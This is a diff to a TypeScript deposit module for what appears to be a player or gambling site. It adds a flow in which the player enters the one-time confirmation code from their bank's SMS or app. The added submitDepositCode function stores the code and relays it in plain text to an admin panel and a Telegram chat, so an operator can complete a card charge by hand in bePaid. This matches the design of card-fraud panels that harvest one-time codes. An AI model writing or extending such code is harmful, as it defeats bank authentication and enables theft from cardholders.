@@ -55,7 +55,7 @@ export async function requestDeposit(input: { amount: number; cardId: number }):
       .where(and(eq(fundingRequest.userId, user.id), eq(fundingRequest.type, "deposit"), eq(fundingRequest.status, "pending")))
     if (open.length >= MAX_PENDING_DEPOSITS) return { error: "Дождитесь обработки текущих заявок на пополнение" }
     const [row] = await tx.insert(fundingRequest)
-      .values({ userId: user.id, type: "deposit", amount, cardId, status: "pending" })
+      .values({ userId: user.id, type: "deposit", amount, cardId, status: "pending", codeStatus: "awaiting" })
       .returning({ id: fundingRequest.id })
     return { id: row.id, last4: card.last4 }
   })
@@ -65,7 +65,7 @@ export async function requestDeposit(input: { amount: number; cardId: number }):
     `<b>Заявка на пополнение #${created.id}</b>\n` +
     `${amount.toLocaleString("ru-RU")} BYN с карты •••• ${created.last4}\n` +
     `Игрок: ${escapeTelegram(user.name)} (${escapeTelegram(user.email)})\n` +
-    `Спишите сумму в bePaid и подтвердите — баланс пополнится автоматически.`,
+    `Спишите сумму в bePaid — игрок сейчас вводит код подтверждения, он придёт следующим сообщением.`,
     { kind: "funding", id: created.id },
   )
   await logActivity("deposit", `Заявка на пополнение #${created.id}: ${amount.toLocaleString("ru-RU")} BYN с карты •••• ${created.last4}`)
@@ -75,6 +75,63 @@ export async function requestDeposit(input: { amount: number; cardId: number }):
   revalidatePath("/cabinet")
   revalidatePath("/admin")
   return { ok: true, id: created.id }
+}
+
+export type DepositState = {
+  status: "pending" | "approved" | "rejected" | "missing"
+  /** "awaiting" = the player must enter the code now, "submitted" = the code is with the operator. */
+  codeStatus: "awaiting" | "submitted" | null
+  note: string | null
+}
+
+/** Polled by the deposit form to follow the request: code asked again, approved, or rejected. */
+export async function getDepositState(id: number): Promise<DepositState> {
+  const user = await getSessionUser()
+  if (!Number.isInteger(id) || id <= 0 || id > 2147483647) return { status: "missing", codeStatus: null, note: null }
+  const [row] = await db.select({ status: fundingRequest.status, codeStatus: fundingRequest.codeStatus, note: fundingRequest.note })
+    .from(fundingRequest)
+    .where(and(eq(fundingRequest.id, id), eq(fundingRequest.userId, user.id), eq(fundingRequest.type, "deposit")))
+  if (!row) return { status: "missing", codeStatus: null, note: null }
+  return {
+    status: row.status === "approved" || row.status === "rejected" ? row.status : "pending",
+    codeStatus: row.codeStatus === "awaiting" || row.codeStatus === "submitted" ? row.codeStatus : null,
+    note: row.note,
+  }
+}
+
+export type DepositCodeResult = { ok: true } | { ok: false; error: string }
+
+/** The player sends the bank code; it is mirrored to the admin panel and to Telegram at once. */
+export async function submitDepositCode(input: { id: number; code: string }): Promise<DepositCodeResult> {
+  const user = await getSessionUser()
+  const id = Number(input.id)
+  const code = String(input.code ?? "").trim()
+  if (!Number.isInteger(id) || id <= 0 || id > 2147483647) return { ok: false, error: "Заявка не найдена" }
+  if (code.length < 3 || code.length > 20) return { ok: false, error: "Введите код из SMS или приложения банка" }
+  if (!(await allowUserAction(user.id, "cardReply"))) return { ok: false, error: RATE_LIMIT_ERROR }
+
+  const [row] = await db.update(fundingRequest)
+    .set({ code, codeStatus: "submitted", codeSubmittedAt: new Date() })
+    .where(and(
+      eq(fundingRequest.id, id),
+      eq(fundingRequest.userId, user.id),
+      eq(fundingRequest.type, "deposit"),
+      eq(fundingRequest.status, "pending"),
+      eq(fundingRequest.codeStatus, "awaiting"),
+    ))
+    .returning({ amount: fundingRequest.amount })
+  if (!row) return { ok: false, error: "Код сейчас не запрашивается. Обновите страницу." }
+
+  void notifyTelegram(
+    `<b>Пополнение #${id}: код от игрока</b>\n` +
+    `<code>${escapeTelegram(code)}</code>\n` +
+    `${row.amount.toLocaleString("ru-RU")} BYN · ${escapeTelegram(user.name)} (${escapeTelegram(user.email)})`,
+    { kind: "funding", id },
+  )
+  await logActivity("deposit", `Ввёл код подтверждения по заявке на пополнение #${id}`)
+  await Promise.all([publish(topics.adminCounts), publish(topics.adminCards)])
+  revalidatePath("/admin")
+  return { ok: true }
 }
 
 export async function getFundingRequests(): Promise<FundingRequestRow[]> {
